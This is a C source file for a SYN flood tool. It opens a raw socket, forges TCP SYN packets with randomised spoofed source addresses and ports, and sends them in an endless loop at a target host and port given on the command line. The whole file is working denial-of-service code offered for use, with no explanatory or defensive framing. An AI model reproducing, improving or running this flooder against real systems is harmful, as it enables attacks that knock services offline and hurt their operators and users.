#include <time.h>
#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <getopt.h>
#include <arpa/inet.h>
#include "structs.h"

u_int16_t DEFAULT_TCP_WINDOW_SIZE;
u_int16_t DEFAULT_TCPIP_SIZE;
u_int16_t DEFAULT_TCP_SIZE;
u_int16_t DEFAULT_TCPIP_TCP_SIZE;
u_int16_t DEFAULT_CHECKSUM_SIZE;

inline u_int16_t generate_flood_syn_packet(uint32_t src, u_int32_t dst, u_int16_t dst_port, void *packet, void *checksum);

inline uint16_t csum(uint16_t *buffer, int size)
{
    unsigned long cksum = 0;

    while (size > 1)
    {
        cksum += *buffer++;
        size -= sizeof(uint16_t);
    }

    if (size)
    {
        cksum += *(unsigned char *)buffer;
    }

    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);

    return (uint16_t)(~cksum);
}

int random_number(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;

    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; 
    }
    else
    {
        low_num = max_num + 1;
        hi_num = min_num;
    }

    result = (rand() % (hi_num - low_num)) + low_num;
    return result;
}

int init_raw_socket()
{
    const int on = 1;
    int socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (socket_fd < 0)
        return socket_fd;
    int set_opt_result = setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    if (set_opt_result < 0)
        return set_opt_result;
    return socket_fd;
}

void usage()
{
    printf("Usage: \n");
    printf(" syn target_host target_port\n\n");
    exit(0);
}

int socket_fd;

int main(int argc, char **argv)
{
    if (argc != 3)
        usage();
    
    srand(time(NULL));
    DEFAULT_TCP_WINDOW_SIZE = htons(65535);
    DEFAULT_TCPIP_SIZE = sizeof(sniff_ip);
    DEFAULT_TCP_SIZE = sizeof(sniff_tcp);
    DEFAULT_TCPIP_TCP_SIZE = DEFAULT_TCPIP_SIZE + DEFAULT_TCP_SIZE;
    DEFAULT_CHECKSUM_SIZE = sizeof(sniff_tcpchecksum);

    socket_fd = init_raw_socket();
    if (socket_fd < 0)
    {
        printf("Failed to init raw socket.\n");
        printf("The error message is: %s\n", strerror(errno));
        exit(-1);
    }

    void *raw_packet = malloc(1024);
    void *raw_checksum = malloc(1024);

    u_int32_t target_host = inet_addr(argv[1]);
    u_int16_t target_port = htons(atoi(argv[2]));

    struct sockaddr_in seraddr;
    seraddr.sin_family = AF_INET;
    seraddr.sin_port = target_port;
    seraddr.sin_addr.s_addr = target_host;

    u_int16_t packet_size = 0;
    while (1)
    {
        packet_size = generate_flood_syn_packet(random_number(0xb4a3156f, 0xffa3156f), target_host, target_port, raw_packet, raw_checksum);
        if (sendto(socket_fd, raw_packet, packet_size, 0, (struct sockaddr *)&seraddr, sizeof(struct sockaddr)) < 0)
        {
            printf("Failed to send packet\n");
            printf("The error message is: %s\n", strerror(errno));
        }
    }

    return 0;
}

inline u_int16_t generate_flood_syn_packet(uint32_t src, u_int32_t dst, u_int16_t dst_port, void *packet, void *checksum)
{
    sniff_ip *raw_tcpip = packet;
    sniff_tcp *raw_tcp = packet + DEFAULT_TCPIP_SIZE;

    raw_tcpip->ip_hlen = 5;
    raw_tcpip->ip_ver = 4;
    raw_tcpip->ip_tos = 0;
    raw_tcpip->ip_len = DEFAULT_TCPIP_TCP_SIZE;
    raw_tcpip->ip_id = htons(random_number(10000, 60000));
    raw_tcpip->ip_flag_reserved = 0;
    raw_tcpip->ip_flag_df = 0;
    raw_tcpip->ip_flag_mf = 0;
    raw_tcpip->ip_off = 0;
    raw_tcpip->ip_ttl = 64;
    raw_tcpip->ip_p = IPPROTO_TCP;
    raw_tcpip->ip_sum = 0;
    raw_tcpip->ip_src = src;
    raw_tcpip->ip_dst = dst;

    raw_tcp->th_sport = htons(random_number(20000, 60000));
    raw_tcp->th_dport = dst_port;
    raw_tcp->th_seq =  htons(random_number(0xb4a3156f, 0xffa3156f));
    raw_tcp->th_ack = 0;
    raw_tcp->th_res1 = 0;
    raw_tcp->th_hlen = 5;
    raw_tcp->th_flag_fin = 0;
    raw_tcp->th_flag_syn = 1;
    raw_tcp->th_flag_rst = 0;
    raw_tcp->th_flag_psh = 0;
    raw_tcp->th_flag_ack = 0;
    raw_tcp->th_flag_urg = 0;
    raw_tcp->th_res2 = 0;
    raw_tcp->th_win = DEFAULT_TCP_WINDOW_SIZE;
    raw_tcp->th_sum = 0;
    raw_tcp->th_urp = 0;

    sniff_tcpchecksum *tcp_checksum = checksum;
    void *tcp_checksum_payload = checksum + DEFAULT_CHECKSUM_SIZE;
    tcp_checksum->saddr = raw_tcpip->ip_src;
    tcp_checksum->daddr = raw_tcpip->ip_dst;
    tcp_checksum->mbz = 0;
    tcp_checksum->protocol = raw_tcpip->ip_p;
    tcp_checksum->tcpl = raw_tcp->th_hlen * 4;
    memcpy(tcp_checksum_payload, raw_tcp, tcp_checksum->tcpl);

    raw_tcp->th_sum = csum((u_int16_t *)tcp_checksum, DEFAULT_CHECKSUM_SIZE + tcp_checksum->tcpl);

    return raw_tcpip->ip_len;
}